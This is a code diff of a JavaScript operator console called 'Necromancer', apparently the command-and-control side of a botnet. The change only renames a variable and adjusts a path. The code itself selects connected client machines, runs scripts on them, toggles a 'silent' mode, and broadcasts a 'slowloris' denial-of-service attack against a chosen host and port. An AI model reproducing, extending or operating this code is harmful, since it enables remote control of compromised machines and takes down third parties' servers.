@@ -13,7 +13,7 @@ export function prompt() {
 	rl.question(`\x1b[31m[Necromancer]\x1b[0m `, (message) => {
 		message = message.toLowerCase();
 
-		const commandArgs = {
+		const args = {
 			first: message.split(" ")[1],
 			second: message.split(" ")[2],
 			third: message.split(" ")[3],
@@ -25,26 +25,26 @@ export function prompt() {
 				console.log(
 					`Instances: ${clientModules.clientInstances.length}`
 				);
-			} else if (commandArgs.first <= clientModules.clients.length) {
+			} else if (args.first <= clientModules.clients.length) {
 				clientModules.clientInstances = [...clientModules.clients];
 				clientModules.clientInstances =
-					clientModules.clientInstances.slice(0, commandArgs.first);
+					clientModules.clientInstances.slice(0, args.first);
 			}
 		}
 
-		if (commandArgs.first === "all")
+		if (args.first === "all")
 			clientModules.clientInstances = [...clientModules.clients];
 
 		if (message.startsWith("select")) {
 			clientModules.clientInstances = Array(
-				clientModules.clientInstances[commandArgs.first]
+				clientModules.clientInstances[args.first]
 			).filter((i) => i !== undefined);
 		}
 
 		if (message.startsWith("silent")) {
 			if (message === "silent")
 				console.log(`silent: ${clientModules.silent}`);
-			else if (commandArgs.first === "true") {
+			else if (args.first === "true") {
 				clientModules.silent = true;
 			} else {
 				clientModules.silent = false;
@@ -54,7 +54,7 @@ export function prompt() {
 		if (message.startsWith("logging")) {
 			if (message === "logging")
 				console.log(`logging: ${clientModules.logging}`);
-			else if (commandArgs.first === "true") {
+			else if (args.first === "true") {
 				clientModules.logging = true;
 				clientModules.silent = true;
 			} else {
@@ -77,7 +77,7 @@ export function prompt() {
 					"You can only use this command on one machine at a time"
 				);
 				return prompt();
-			} else if (commandArgs.first !== undefined) {
+			} else if (args.first !== undefined) {
 				if (clientModules.logging) {
 					fileNum++;
 					broadcast(message);
@@ -90,7 +90,7 @@ export function prompt() {
 		}
 
 		if (message.startsWith("run")) {
-			runScript(commandArgs.first);
+			runScript(args.first);
 		}
 
 		if (message.startsWith("slowloris")) {
@@ -98,7 +98,7 @@ export function prompt() {
 				console.log(
 					"Please provide arguments: slowloris (host) (port) (duration ms) (sockets)"
 				);
-			else if (commandArgs.first !== undefined) {
+			else if (args.first !== undefined) {
 				broadcast(message);
 				console.log(`Attack sent!`);
 			}
@@ -110,7 +110,7 @@ export function prompt() {
 	});
 }
 
-const scriptsDir = "../config/scripts";
+const scriptsDir = "../../config/scripts";
 
 function listScripts() {
 	fs.readdir(scriptsDir, (err, files) => {
